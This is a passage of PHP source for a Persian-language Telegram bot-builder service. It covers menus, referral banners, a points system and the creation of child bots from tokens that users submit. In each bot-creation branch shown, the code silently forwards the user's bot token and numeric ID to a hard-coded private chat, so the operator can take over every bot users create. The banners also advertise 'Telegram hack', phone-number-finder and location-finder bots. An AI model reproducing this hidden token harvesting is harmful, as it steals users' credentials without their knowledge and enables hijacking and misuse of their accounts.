if($xdata == "ozvgirii"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$xchatid,
'text'=>"
👇لطفا نوع بنر را مشخص کنید👇
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"⚫شیشه ای⚫"],['text'=>"⚪ساده⚪️"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//====================//
elseif($text == '⚪ساده⚪️'){
	$caption = "
🤖رباتساز $name_bot🤖

🚀با سرعت فوق العاده و بدون آفی🚀

👥ممبرگیر👥
🛒فروشگاه🛒
🛡ضد لینک🛡
🗣پیام رسان🗣
📱هک تلگرام📱
🎙ویس سیتی🎙
💬چت ناشناس💬
📞دریافت شماره📞
🤖رباتساز نمایندگی🤖
و...

👇رباتساز رو استارت کن و ربات خودتو بساز👇

https://t.me/$bot_id?start=$from_id";
	
	bot('SendPhoto',[
	'photo'=>new CURLFile("1.mp4"),
	'chat_id'=>$chat_id,
	 'caption'=>$caption,
	'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
]
])
]);
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"
👆بنر بالا را در گروه ها و کانال هایتان ارسال کنید و به ازای هر کاربری که با لینک شما ربات را استارت کند به شما امتیاز تعلق می یابد👆

👇یا هم اینکه از طریق لینک زیر و با مراجعه به پشتیبانی امتیاز خریداری کنید👇",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"👤پشتیبانی $name_bot👤",'url'=>"https://t.me/$support"]],
]
])
]);
}
elseif($text == '⚫شیشه ای⚫'){
	$caption = "
🤖رباتساز $name_bot🤖

🚀با سرعت فوق العاده و بدون آفی🚀

👥ممبرگیر👥
🛒فروشگاه🛒
🛡ضد لینک🛡
🗣پیام رسان🗣
📱هک تلگرام📱
🎙ویس سیتی🎙
💬چت ناشناس💬
📞دریافت شماره📞
🤖رباتساز نمایندگی🤖
و...

👇رباتساز رو استارت کن و ربات خودتو بساز👇

https://t.me/$bot_id?start=$from_id";

	bot('SendPhoto',[
	'photo'=>new CURLFile("1.mp4"),
	'chat_id'=>$chat_id,
	 'caption'=>$caption,
	'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
    [['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
[['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
[['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
[['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
[['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
[['text'=>"⚙ساخت ربات کاربردی⚙",'url'=>"https://t.me/$bot_id"]],
[['text'=>"👤ساخت ربات جذب ممبر👤",'url'=>"https://t.me/$bot_id"]],
[['text'=>"🤖ساخت رباتساز نمایندگی🤖",'url'=>"https://t.me/$bot_id"]],
]
])
]);	
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"👆بنر بالا را در گروه ها و کانال هایتان ارسال کنید و به ازای هر کاربری که با لینک شما ربات را استارت کند به شما امتیاز تعلق می یابد👆

👇یا هم اینکه از طریق لینک زیر و با مراجعه به پشتیبانی امتیاز خریداری کنید👇",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"👤پشتیبانی $name_bot👤",'url'=>"https://t.me/$bot_id"]],
]
])
]);
}
//=========================//

//=========================//
elseif($text1 == "🤖آموزش ساخت ربات🤖"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👇مراحل زیر را برای ساخت ربات انجام دهید👇

1⃣ ابتدا وارد ربات بات فادر (@BotFather) شوید.

2⃣ سپس دستور /newbot را ارسال کنید.

3⃣ اکنون نام ربات مورد نظر خود را ارسال کنید.

4⃣ بعد از ارسال نام رباتتان یوزرنیم مورد نظر خود را ارسال نمایید ولی توجه داشته باشید که در آخر یوزرنیم ربات کلمه Bot وجود داشته باشد.

5⃣ اگر با پیغام 

(Sorry, this username is already taken. Please try something different.)

مواجه شدید بدین معنا است که این یوزرنیم قبل انتخاب شده و باید یوزرنیم دیگری انتخاب کنید ولی اگر با این پیغام مواجه نشدید یعنی عملیات با موفقیت انجام شده است.

6⃣حال در آخرین پیامی که بات فادر برای شما ارسال کرده است متنی شبیه متن زیر است. 

1246954004:AAG8Dpcq630xix1k6QCNQ2CuHyXN2f7j8H8

به این متن طولانی توکن ربات گفته می شود که می توانید با ارسال آن به رباتساز $name_bot ربات مورد نظر خود را بسازید.
",
'parse_mode'=>"HTML",  
]);
}
elseif($text1 == "🤖راهنمای دستورات بات فادر🤖️"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖لیست دستورات بات فادر🤖 

👇حذف ربات👇
/deletebot 

👇تغییر نام ربات👇
/setname 

👇افزودن اینلاین👇
/setinline 

👇تنظیمات اینلاین👇 
/setinlinefeedback

👇افزودن توضیحات👇
/setdescription

👇ساخت ربات جدید👇 
/newbot 

👇لغو آخرین عملیات👇
/cancel

👇دریافت توکن ربات👇
/token 

👇افزودن عکس ربات👇
/setuserpic 

👇تغییر دادن توکن ربات👇
/revoke 

👇افزودن متن درباره ربات👇 
/setabouttext

👇درخواست دریافت موقعیت👇 
/setinlinegeo 

👇تنظیم دسترسی به پیام های گروه👇
/setprivacy 

👇تنظیم دستور که با / شروع می شود👇
/setcommands

👇تنظیم عضویت و عدم عضویت  گروه👇
/setjoingroups
",
'parse_mode'=>"HTML",  
]);
}
//==============حساب کاربری==========//
elseif($text1 == "📋اطلاعات من📋"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👤نام شما👤
$first_name

🔡آیدی شما🔡
@$username

🔢آیدی عددی شما🔢
$from_id

💰امتیاز شما💰
$coin

📇نوع حساب شما📇
$type

📊وضعیت اکانت شما📊
Active

🏆تعداد امتیاز جهت ویژه شدن🏆
20
",
'parse_mode'=>"HTML",
]);
}
//===========================//
elseif($text1 == "🏅امتیازات شما"){
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
 اطلاعات حساب شما 👇
",
]);
 sleep(1);
bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"P",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡آیدی شما🔡",'callback_data'=>'prooo']],
[['text'=>"Pr",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡آیدی شما💰",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"📇نوع حساب شما📇",'callback_data'=>'prooo']],
[['text'=>"Pro",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"💰امتیاز شما💰",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"📇نوع حساب شما📇",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡یوزرنیم شما🔡",'callback_data'=>'prooo']],
[['text'=>"Pro G",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"💰امتیاز شما💰",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"📇نوع حساب شما📇",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡یوزرنیم شما🔡",'callback_data'=>'prooo']],
[['text'=>"$from_id",'callback_data'=>'prooo'],['text'=>"🖊 - ایدی عددی شما",'callback_data'=>'prooo']],
[['text'=>"Pro GR",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"💰امتیاز شما💰",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"📇نوع حساب شما📇",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡یوزرنیم شما🔡",'callback_data'=>'prooo']],
[['text'=>"$from_id",'callback_data'=>'prooo'],['text'=>"🖊 - ایدی عددی شما",'callback_data'=>'prooo']],
[['text'=>"active✅",'callback_data'=>'prooo'],['text'=>"⭐ وضعیت اکانت",'callback_data'=>'prooo']],
[['text'=>"$name_bot",'callback_data'=>'prooo']],
]
])
]);
 sleep(1);
 bot('editMessagetext',[
'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>"
 اطلاعات حساب شما 👇
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"👤نام شما👤",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"💰امتیاز شما💰",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"📇نوع حساب شما📇",'callback_data'=>'prooo']],
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"🔡یوزرنیم شما🔡",'callback_data'=>'prooo']],
[['text'=>"$from_id",'callback_data'=>'prooo'],['text'=>"🖊 - ایدی عددی شما",'callback_data'=>'prooo']],
[['text'=>"active✅",'callback_data'=>'prooo'],['text'=>"⭐ وضعیت اکانت",'callback_data'=>'prooo']],
[['text'=>"☆ $name_bot ☆",'callback_data'=>'prooo']],
]
])
]);
}
//===================راهنما====//
elseif($text1 == "راهنما 📖"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🌿توجه:
لطفا قبل از استفاده از ربات متن زیر رو به دقت بخونید.

1⃣اگر حساب شما رایگان میباشد شما فقط قادر به ساخت یک ربات در بخش رایگان میباشید.

2⃣اگرحساب شما ویژه باشد شما قادر به ساخت 5 پوشه در بخش ویژه میباشید و میتوانید سورس ربات هایی که بیش از 1فایل را دارند را اجرا کنید.

3⃣بعد از ساخت پوشه در بخش ویژه(برای کاربر حساب رایگان 1پوشه در بخش ویژه و برای کاربر حساب ویژه 5پوشه ) بر روی (پوشه های من) بزنید و شناسه پوشه ای که میخواهید در آن سورس رو آپلود کنید کپی کنید.

4⃣بعد از دریافت شناسه پوشه بر روی آپلود سورس بزنید در ابتدا شناسه پوشه ای که میخواهید سورس در آن پوشه قرار گیرد را ارسال کنید سپس فایل مورد نظر را بفرستید ربات فایل را در ان پوشه قرار میدهد برای اپلود بیش از یک فایل دوباره این مراحل را تکرار کنید و در پوشه مورد نظر قرار دهید اما نام فایل های اپلودی یکی نباشد.

5⃣فایل هایی که به ربات میفرستید نباید فشرده zip باشند و حتما در فرمت php باید باشد.

6⃣سورسی که میخوای ران بشه رو مطمعن شو که بدون مشکل باشه.

7⃣اگر قبلا یک ربات ساختی و از قبل ران کردی از ارسال مجدد سورس همون ربات خودداری کن. سورس جدیدی بفرست تا ران بشه و نام سورس های ارسالی یکی نباشه هر بار با اسم انگلیسی مختلف بفرست تا به راحتی ران بشه.
",
]);
}
//===============حساب ویژه==============//
elseif($text1 == "🗄ربات های من🗄"){
if($created == "yes"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🗄لیست ربات های شما🗄
@$user_bots
",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌شما هنوز رباتی نساخته اید❌️",
]);
}
}
//====================
elseif($text1 == "ویوپنل هنوز نمیسازه"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","viewpanel");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 0 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "viewpanel" && $text !="↩️برگشت" ){
function objectToArrays($object) {
if (!is_object($object) && !is_array($object)) {
            return $object;
        }
    
        if (is_object($object)) {
            $object = get_object_vars($object);
        }
    
        return array_map("objectToArrays", $object);
    }
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$randbotsa/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$randbotsa/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$randbotsa");
mkdir("bot00/$randbotsa/data");
file_put_contents("bot00/$randbotsa/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/ViewPanel/index.php");
$index = str_replace("[*[TOKEN]*]",$text,$index);
$index = str_replace("[*[ADMIN]*]",$from_id,$index);
file_put_contents("bot00/$randbotsa/index.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$randbotsa."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($randbotsa,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $randbotsa."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($randbotsa,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $randbotsa."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//======================

//=================================
elseif($text1 == "📞شماره یاب📞" && $mode == vip){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","number");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 5 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "number" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌',
]);
}else{
file_put_contents("data/$chat_id/number.txt",$text);
file_put_contents("data/$from_id/state.txt","number1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "number1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$randbotsa/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$randbotsa/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$randbotsa");
mkdir("bot00/$randbotsa/data");
file_put_contents("bot00/$randbotsa/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/number/index.php");
$index = str_replace("[*[TOKEN]*]",$text,$index);
$index = str_replace("[*[ADMIN]*]",$from_id,$index);
$index = str_replace("[*[CHANNEL]*]",$channel,$index);
$index = str_replace("[*[USERNAME]*]",$randbotsa,$index);
file_put_contents("bot00/$randbotsa/index.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$randbotsa."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($randbotsa,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $randbotsa."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($randbotsa,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $randbotsa."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 5;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//=================================

//=================================
elseif($text1 == "🎙ویس سیتی🎙" && $mode == "vip"){
if($coin >= 5){
file_put_contents("data/$from_id/state.txt","voice");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 5 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "voice" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید ❌',
]);
}else{
file_put_contents("data/$chat_id/voice.txt",$text);
file_put_contents("data/$from_id/state.txt","voice1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "voice1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/voice/index.php");
$index = str_replace("[*[TOKEN]*]",$text,$index);
$index = str_replace("[*[ADMIN]*]",$from_id,$index);
$index = str_replace("[*[USERNAME]*]",$un,$index);
$index = str_replace("[*[CHANNEL]*]",$channel,$index);
file_put_contents("bot00/$un/index.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//==========================

//=======================

//============================
elseif($text1 == "🗺مکان یاب🗺"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","makan");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "makan" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌
',
]);
}else{
file_put_contents("data/$chat_id/makan.txt",$text);
file_put_contents("data/$from_id/state.txt","makan1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "makan1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
